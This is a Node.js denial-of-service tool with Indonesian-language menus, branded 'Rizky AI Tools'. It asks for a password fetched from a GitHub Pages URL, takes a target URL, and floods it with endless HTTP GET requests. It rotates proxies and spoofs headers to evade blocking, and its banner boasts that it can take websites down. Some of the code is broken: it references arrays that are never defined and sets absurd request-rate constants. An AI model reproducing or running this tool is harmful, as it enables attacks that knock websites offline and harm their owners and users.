const axios = require('axios');
const fs = require('fs');
const SocksProxyAgent = require('socks-proxy-agent');
const HttpsProxyAgent = require('https-proxy-agent');
const readline = require('readline');

const proxyF = "proxy.txt";
const uaLF = "ua.txt";
const userAgents = "wx.txt";

const acceptHeader = [
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5",
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9",
  "text/html; charset=utf-8",
  "application/json, text/plain, */*",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
  "text/plain",
  "text/html",
  "application/json",
  "application/xml",
  "multipart/form-data",
  "application/octet-stream",
  "image/jpeg",
  "image/png",
  "audio/mpeg",
  "video/mp4",
  "application/javascript",
  "application/pdf",
  "application/vnd.ms-excel",
  "application/vnd.ms-powerpoint",
  "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
  "application/vnd.openxmlformats-officedocument.presentationml.presentation",
  "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
  "application/zip",
  "image/gif",
  "image/bmp",
  "image/tiff",
  "audio/wav",
  "audio/midi",
  "video/avi",
  "video/mpeg",
  "video/quicktime",
  "text/csv",
  "text/xml",
  "text/css",
  "text/javascript",
  "application/graphql",
  "application/x-www-form-urlencoded",
  "application/vnd.api+json",
  "application/ld+json",
  "application/x-pkcs12",
  "application/x-pkcs7-certificates",
  "application/x-pkcs7-certreqresp",
  "application/x-pem-file",
  "application/x-x509-ca-cert",
  "application/x-x509-user-cert",
  "application/x-x509-server-cert",
  "application/x-bzip",
  "application/x-gzip",
  "application/x-7z-compressed",
  "application/x-rar-compressed",
  "application/x-shockwave-flash"
];

function readProxy() {
    try {
        const data = fs.readFileSync(proxyF, "utf8");
        return data.trim().split("\n").map((line) => line.trim());
    } catch (error) {
        console.error(`Failed to read proxy list: ${error}`);
        return [];
    }
}

function readUA() {
    try {
        const data = fs.readFileSync(uaLF, "utf-8").replace(/\r/g, "").split("\n");
        return data.map((line) => line.trim());
    } catch (error) {
        console.error(`Failed to read user agent list: ${error}`);
        return [];
    }
}

function sanitizeUA(userAgent) {
    return userAgent.replace(/[^\x20-\x7E]/g, "");
}

function randElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

const delay = 0;

function sendReq(target, agent, userAgent) {
    const sanitizedUserAgent = sanitizeUA(randElement(userAgents));
    const headers = {
        "User-Agent": sanitizedUserAgent,
        Accept: randElement(acceptHeader),
        "Accept-Encoding": randElement(encodingHeader),
        "Accept-Language": randElement(langHeader),
        Referer: randElement(refers),
        "Cache-Control": randElement(cplist),
        DNT: "1",
        Connection: "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        TE: "Trailers",
    };

    axios
        .get(target, { httpAgent: agent, headers: headers, timeout: 0 })
        .then((_) => {
            setTimeout(() => sendReq(target, agent, userAgent), 0);
        })
        .catch((error) => {
            if (error.response && error.response.status === 503) {
                console.log("wkwk");
            } else if (error.response && error.response.status === 502) {
                console.log("Error: Request failed with status code 502");
            } else {
                console.log("Error: " + error.message);
            }
            setTimeout(() => sendReq(target, agent, userAgent), 0);
        });
}

function sendReqs(targetUrl) {
    const proxies = readProxy();
    const userAgentsList = readUA();

    if (proxies.length > 0) {
        const proxy = randElement(proxies);
        const proxyParts = proxy.split(":");
        const proxyProtocol = proxyParts[0].startsWith("socks") ? "socks5" : "http";
        const proxyUrl = `${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]}`;
        const agent = proxyProtocol === "socks5"
            ? new SocksProxyAgent(proxyUrl)
            : new HttpsProxyAgent(proxyUrl);

        sendReq(targetUrl, agent, randElement(userAgentsList));
    } else {
        sendReq(targetUrl, null, randElement(userAgentsList));
    }
}

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

// ✅ Tambahan fungsi ambil password dari GitHub
async function getPasswordFromGitHub() {
    try {
        const response = await axios.get('https://rizky598.github.io/api/password.json');
        return response.data.password;
    } catch (error) {
        console.log('\x1b[31m⚠️ Gagal mengambil password dari server GitHub.\x1b[0m');
        process.exit(1);
    }
}

// 🔐 Ubah fungsi askPassword() agar ambil dari API
async function askPassword() {
    const serverPassword = await getPasswordFromGitHub();
    rl.question('\x1b[38;5;208m[🔒] Masukkan Password: \x1b[0m', (password) => {
        if (password !== serverPassword) {
            console.log('\x1b[38;5;196m⛔ Password salah! Akses ditolak.\x1b[0m\n');
            askPassword(); // ulangi
        } else {
            showMenu();
        }
    });
}

function showMenu() {
    console.log(`
╭━𓊈 𝐑𝐈𝐙𝐊𝐘 𝐀𝐈 𝐓𝐎𝐎𝐋𝐒 𓊉━═╣
║𝙱𝙾𝚃 𝙽𝙰𝙼𝙴 : ⚙️ 𝐑𝐢𝐳𝐤𝐲-𝐀𝐢 ⚙️
┃𝚅𝙴𝚁𝚂𝙸𝙾𝙽  : 2.2
║𝙰𝚄𝚃𝙷𝙾𝚁   : 𝐑𝐢𝐳𝐤𝐲 𝐜𝐲𝐛𝐞𝐫
╰━━━━━━━━━━━━━━━━━━━━━━━═╣

┏━━『 ⚠️ 𝗣𝗘𝗥𝗜𝗡𝗚𝗔𝗧𝗔𝗡 』
╿☒ ⧽ 𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗘𝗥𝗔𝗡𝗚 𝗦𝗜𝗧𝗨𝗦 𝗣𝗘𝗠𝗘𝗥𝗜𝗡𝗧𝗔𝗛
╽☒ ⧽ 𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗘𝗥𝗔𝗡𝗚 𝗦𝗜𝗧𝗨𝗦 𝗣𝗘𝗡𝗗𝗜𝗗𝗜𝗞𝗔𝗡
┗━━━━━━━━━━━━━━━━━━━━━━━━
`);
    askForUrl();
}

function askForUrl() {
    console.log('\x1b[38;5;40m╭━𓊈 𝗥𝗜𝗭𝗞𝗬 𝗔𝗜 - 𝗨𝗥𝗟 𝗜𝗡𝗣𝗨𝗧 𓊉━═╣\x1b[0m');
    console.log('\x1b[38;5;40m┃📥 ᴍᴀꜱᴜᴋᴋᴀɴ ᴜʀʟ ᴛᴀʀɢᴇᴛ ᴜɴᴛᴜᴋ ᴅɪꜱᴇʀᴀɴɢ\x1b[0m');
    console.log('\x1b[38;5;40m╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═╣\x1b[0m');

    rl.question('\x1b[38;5;82m[🌐] URL Target:\x1b[0m', (url) => {
        if (!url.startsWith("http://") && !url.startsWith("https://")) {
            console.log('\x1b[38;5;196m╭━⛔ 𝗘𝗥𝗥𝗢𝗥 ━╮');
            console.log('┃ URL tidak valid!');
            console.log('┃ Harus diawali dengan "http://" atau "https://"');
            console.log('╰━━━━━━━━━━━━━╯\x1b[0m\n');
            askForUrl(); // tanya ulang
        } else {
     

console.log("\x1b[38;5;46m");
console.log("╭━𓊈 \x1b[38;5;82m𝗥𝗜𝗭𝗞𝗬 𝗔𝗜\x1b[38;5;46m - \x1b[38;5;82m𝗗𝗢𝗦 𝗠𝗢𝗗𝗘\x1b[38;5;46m 𓊉━═╣");
console.log("┃ ⚙️ \x1b[38;5;190m𝗠𝗘𝗡𝗬𝗘𝗥𝗔𝗡𝗚 𝗧𝗔𝗥𝗚𝗘𝗧 𝗗𝗘𝗡𝗚𝗔𝗡 𝗗𝗢𝗦 ⚙️\x1b[38;5;46m");
console.log("┃═════════════════════════════════");
console.log("┃📡 \x1b[38;5;220m𝗣𝗥𝗢𝗚𝗥𝗘𝗦 : \x1b[0mꜱᴇᴅᴀɴɢ ᴍᴇɴɢɪʀɪᴍ ʀᴇQᴜᴇꜱᴛ ᴋᴇ ᴛᴀʀɢᴇᴛ");
console.log("┃🕒 \x1b[38;5;190m𝗣𝗘𝗦𝗔𝗡   : \x1b[0mᴊᴀɴɢᴀɴ ꜱᴇʀᴀɴɢ ᴡᴇʙꜱɪᴛᴇ ᴛᴇʀʟᴀʟᴜ ʟᴀᴍᴀ");
console.log("┃⚠️ \x1b[38;5;196m 𝗘𝗙𝗘𝗞    : \x1b[0mʙɪꜱᴀ ʙɪᴋɪɴ ᴡᴇʙꜱɪᴛᴇ ᴅᴏᴡɴ ᴘᴀᴋᴀɪʟᴀʜ ᴅᴇɴɢᴀɴ ʙɪᴊᴀᴋ");
console.log("╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═╣");
console.log("📦 MENGUNDUH DATA");
console.log("\x1b[0m");

let percent = 0;
const width = 30;

setInterval(() => {
  const filled = Math.floor(percent / (100 / width));
  const empty = width - filled;
  const bar = '█'.repeat(filled) + '▒'.repeat(empty);

  process.stdout.write(`\r\x1b[32m𓊈${bar}𓊉 ${percent}🚀\x1b[0m`);
  percent += 10;
  if (percent > 100) percent = 0;
}, 100);

            let continueAttack = true;
            const maxRequests = 100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000;

            const requestsPerSecond = 10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000;

            const attack = () => {
                try {
                    if (!continueAttack) return;

                    const userAgent = randElement(userAgents);
                    const headers = {
                        'User-Agent': userAgent
                    };

                    axios.get(url, { headers })
                        .then((response) => {
                            if (response.status === 503) {
                            }
                        })
                        .catch((error) => {
                            if (error.response && error.response.status === 502) {
                            }
                        });

                    setTimeout(attack, 1000 / requestsPerSecond);
                } catch (error) {
                    console.log("Error: " + error.message);
                    setTimeout(attack, 1000 / requestsPerSecond);
                }
            };

            const numThreads = 100;
            for (let i = 0; i < numThreads; i++) {
                attack();
            }

            setTimeout(() => {
                continueAttack = false;
                console.log('Max requests reached');
                askForUrl();
            }, maxRequests / requestsPerSecond * 1000);
        }
    });
}

// 🔐 Mulai dengan minta password
askPassword();
